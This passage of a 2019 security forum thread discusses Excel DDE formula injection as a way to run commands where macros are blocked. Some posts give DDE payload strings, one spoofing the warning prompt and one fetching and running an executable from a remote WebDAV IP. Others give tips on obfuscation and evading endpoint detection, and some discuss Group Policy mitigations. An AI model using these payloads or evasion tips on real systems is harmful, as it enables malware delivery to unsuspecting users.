</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T14:28:06Z" class="post-time">
January 14, 2019, 2:28pm
</time>
<meta itemprop="dateModified" content="2019-01-14T22:12:19Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>These were the first ones I used! Excellent article by the way. I did try most of the payloads you suggested and compiling them on the fly with <code>Microsoft.Workflow.Compiler.exe</code> and even tried with <code>csc.exe</code> in the .NET folder. Unfortunately they were all detected. Crowdstrike prevented the execution on my machine so I‚Äôm surprised it didnt show up in Virus Total but my tests are fairly recent.</p>
<p>However, I have an idea that I want to test and it might work well with your payloads. Instead compiling on the fly with both of these, about using the IL disassembly and recompile it on the fly instead or compiling the code itself?</p>
<p>If it works I‚Äôll probably do another write up and give you credit for some ideas <img src="../../../images/emoji/twitter/stuck_out_tongue.png%3Fv=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/9/96b68198cda08808004801a4327518a81a267178.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T15:27:12Z" class="post-time">
January 14, 2019, 3:27pm
</time>
<meta itemprop="dateModified" content="2019-01-14T15:27:12Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Just did a fresh install in a VM on Windows 10 Pro fully patched and I don‚Äôt have the issue.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/96b68198cda08808004801a4327518a81a267178.png" alt="image" data-base62-sha1="lvgDzVuoyHT8cz7ySCIsiTIUeaQ" width="608" height="499"></p>
<p>You probably have a GPO that adds two additional check boxes (within the red box I added on the picture) to enable/disable the DDE server lookup and launch. The DDE server launch one if probably not checked (which is a good thing).</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ThunderSon"><span itemprop="name">ThunderSon</span></a>
(Thunder-Son)
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T16:10:55Z" class="post-time">
January 14, 2019, 4:10pm
</time>
<meta itemprop="dateModified" content="2019-01-14T16:10:55Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hello. Nice write-up and finding! Are you aware of what GPOs this can bypass? What is a solution that can block execution from the GPO‚Äôs level without bricking excel? I can‚Äôt fully test this since I don‚Äôt have the proper environment for it, yet it seems to be a bypass ‚Ä¶</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/guly"><span itemprop="name">guly</span></a>
(guly)
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T16:35:27Z" class="post-time">
January 14, 2019, 4:35pm
</time>
<meta itemprop="dateModified" content="2019-01-14T16:41:57Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>‚Äìedit: removed because not relevant</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/b/bb3734339210d8d56a57877905851e9c99a117a5.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T16:56:43Z" class="post-time">
January 14, 2019, 4:56pm
</time>
<meta itemprop="dateModified" content="2019-01-14T16:56:43Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I‚Äôm not sure I understand the question very well but I‚Äôll try to answer. The reason DDE is used is because the environment has the macros disabled by GPO. The GPOs in question I believe are:</p>
<ul>
<li><em>Block macros from running in Office files from the Internet</em></li>
<li><em>Disable VBA for Office applications</em></li>
<li>
<em>VBA Macro Notification Settings</em> set to <em>Disable all with notification</em>
</li>
</ul>
<p>As far as I know and as shown in my reply to Alfred above, by default DDE execution of external content is enabled by default. It will however create a pop-up message asking the user if he wishes to run cmd.exe (but as you know most people click stuff without reading) like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bb3734339210d8d56a57877905851e9c99a117a5.png" alt="image" data-base62-sha1="qIbyLKFn8aze52AIZVLAoQc1ucd" width="613" height="62"></p>
<p>There is also a way to manipulate that message to replace cmd.exe with excel.exe using the following line:<br>
<code>=EXCEL|'\..\..\..\Windows\System32\cmd.exe /c notepad.exe'!_xlbgnm.A1</code></p>
<p>Then‚Ä¶<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bcfc02745f82dd67c3a43bdaf796c6eb22543511.png" alt="image" data-base62-sha1="qXPGVXr1zwv6uF7VTUlymxaZN97" width="614" height="62"></p>
<p>Much more credible, isn‚Äôt it?</p>
<p>I will edit the article to add it.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ThunderSon"><span itemprop="name">ThunderSon</span></a>
(Thunder-Son)
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T17:13:54Z" class="post-time">
January 14, 2019, 5:13pm
</time>
<meta itemprop="dateModified" content="2019-01-14T17:13:54Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p>My question falls there exactly. How can you secure your Windows system against that by using GPOs and user restrictions? Reading as well on DDE since I am barely aware of it. Thank you for the extra bit as well!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T17:39:27Z" class="post-time">
January 14, 2019, 5:39pm
</time>
<meta itemprop="dateModified" content="2019-01-14T17:39:27Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Unfortunately I don‚Äôt know the specifics but Microsoft describes how to do it in a security advisory from 2 years ago:<br>
<aside class="onebox allowlistedgeneric">
<header class="source">
<a href="https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440#mitigating-dde-attack-scenarios" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width height>
<h3><a href="https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440#mitigating-dde-attack-scenarios" target="_blank" rel="noopener nofollow ugc">Microsoft Security Advisory 4053440</a></h3>
<p>Microsoft is releasing this security advisory to provide information regarding security settings for Microsoft Office applications. This advisory provides guidance on what users can do to ensure that these applications are properly secured when...</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
</p>
<p>Hope it helps!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Alfred_Kayuan"><span itemprop="name">Alfred_Kayuan</span></a>
(Alfred Kayuan)
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/7/7d061fc93f07e809da66e911d832687823ad36dc.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-14T19:31:30Z" class="post-time">
January 14, 2019, 7:31pm
</time>
<meta itemprop="dateModified" content="2019-01-14T23:41:09Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>After thinking through i went to Trust Security center Option and found this</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7d061fc93f07e809da66e911d832687823ad36dc.png" alt="Excel-DDE" data-base62-sha1="hQ0NTwLZLyTKDSOcQuKQa9yMBSQ" width="646" height="500"></p>
<p>after checking that it works. so for some reason i do not understand how that possibly got UNchecked in the first place and i have seen people make a test on 2016 excel which works</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/GetTheGuru"><span itemprop="name">GetTheGuru</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-15T07:08:39Z" class="post-time">
January 15, 2019, 7:08am
</time>
<meta itemprop="dateModified" content="2019-01-15T07:08:39Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi, I think it depends - in Excel 2016 via office 365 has it in by default but the standalone installer which most enterprises use don‚Äôt have it. At least that‚Äôs my experience so far. Nice post.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_19" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/GianniScavo"><span itemprop="name">GianniScavo</span></a>
(netdestroyer)
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-15T11:26:00Z" class="post-time">
January 15, 2019, 11:26am
</time>
<meta itemprop="dateModified" content="2019-01-15T11:26:00Z">
<span itemprop="position">19</span>
</span>
</div>
<div class="post" itemprop="text">
<p>is there a way for obfuscate the string ? ( =cmd|‚Äô/c cmd.exe /c ‚Äú\167.160.187.142\webdav\run.exe‚Äù‚Äô!_xlbgnm.A1 )</p>
<p>thanks</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Pppppp"><span itemprop="name">Pppppp</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../10802.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-01-16T13:12:18Z" class="post-time">
January 16, 2019, 1:12pm
</time>
<meta itemprop="dateModified" content="2019-01-16T13:12:18Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Inline obfuscation works for Excel DDEs. See <a href="https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation" rel="nofollow noopener">https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation</a></p>
<p>To satisfy OP‚Äôs curiosity about half of the Endpoint products in the space currently have protection for Excel.exe -&gt; cmd.exe, including Carbon Black. More have protection for Winword.exe -&gt; cmd.exe and less have protection for Outlook.exe -&gt; cmd.exe. So Outlook DDEs are great since Outlook is often overlooked.<br>
If you use the uncommon LoLBins found at <a href="https://lolbas-project.github.io/" rel="nofollow noopener">https://lolbas-project.github.io/</a> DDEs will have success against any product.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><b><a rel="next" itemprop="url" href="../10802%3Fpage=2.html">next page ‚Üí</a></b></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script data-cfasync="false" src="../../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
